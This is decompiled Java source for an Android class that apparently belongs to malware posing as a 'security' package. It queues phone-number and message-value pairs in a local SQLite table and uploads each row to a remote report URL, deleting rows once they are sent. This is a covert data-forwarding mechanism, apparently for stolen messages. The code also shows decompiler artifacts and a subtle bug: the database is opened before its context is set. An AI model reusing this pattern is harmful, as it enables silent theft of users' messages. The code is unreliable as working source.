package com.android.security;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteStatement;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class DataStorage {
    private static final String DATABASE_NAME = "secsuite.db";
    private static final int DATABASE_VERSION = 1;
    private static final String INSERT = "insert into delay_data(number,value) values (?,?)";
    private static final String TABLE_NAME = "delay_data";
    private Context context;
    private SQLiteDatabase db = new OpenHelper(this.context).getWritableDatabase();
    private SQLiteStatement insertStmt = this.db.compileStatement(INSERT);

    public DataStorage(Context context2) {
        this.context = context2;
    }

    public int SendSavedMessages() {
        SQLiteDatabase sQLiteDatabase = this.db;
        String[] strArr = new String[3];
        strArr[0] = "id";
        strArr[DATABASE_VERSION] = "number";
        strArr[2] = "value";
        Cursor cursor = sQLiteDatabase.query(TABLE_NAME, strArr, (String) null, (String[]) null, (String) null, (String) null, "id asc");
        int Result = 0;
        if (cursor.moveToFirst()) {
            while (WebManager.MakeHttpRequest(ValueProvider.GetMessageReportUrl(cursor.getString(DATABASE_VERSION), "/SQL/" + cursor.getString(2))) == 200) {
                Result += DATABASE_VERSION;
                SQLiteDatabase sQLiteDatabase2 = this.db;
                String[] strArr2 = new String[DATABASE_VERSION];
                strArr2[0] = cursor.getString(0);
                sQLiteDatabase2.delete(TABLE_NAME, "id=?", strArr2);
                if (!cursor.moveToNext()) {
                    break;
                }
            }
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return Result;
    }

    public long insert(String Number, String Value) {
        this.insertStmt.bindString(DATABASE_VERSION, Number);
        this.insertStmt.bindString(2, Value);
        return this.insertStmt.executeInsert();
    }

    public void deleteAll() {
        this.db.delete(TABLE_NAME, (String) null, (String[]) null);
    }

    public List<String> selectAll() {
        List<String> list = new ArrayList<>();
        SQLiteDatabase sQLiteDatabase = this.db;
        String[] strArr = new String[2];
        strArr[0] = "number";
        strArr[DATABASE_VERSION] = "value";
        Cursor cursor = sQLiteDatabase.query(TABLE_NAME, strArr, (String) null, (String[]) null, (String) null, (String) null, "id desc");
        if (cursor.moveToFirst()) {
            do {
                list.add(cursor.getString(0));
                list.add(cursor.getString(DATABASE_VERSION));
            } while (cursor.moveToNext());
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return list;
    }

    private static class OpenHelper extends SQLiteOpenHelper {
        OpenHelper(Context context) {
            super(context, DataStorage.DATABASE_NAME, (SQLiteDatabase.CursorFactory) null, DataStorage.DATABASE_VERSION);
        }

        public void onCreate(SQLiteDatabase db) {
            db.execSQL("CREATE TABLE delay_data(id INTEGER PRIMARY KEY AUTOINCREMENT, number TEXT not null , value TEXT not null)");
        }

        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            Log.w("Example", "Upgrading database, this will drop tables and recreate.");
            db.execSQL("DROP TABLE IF EXISTS delay_data");
            onCreate(db);
        }
    }
}
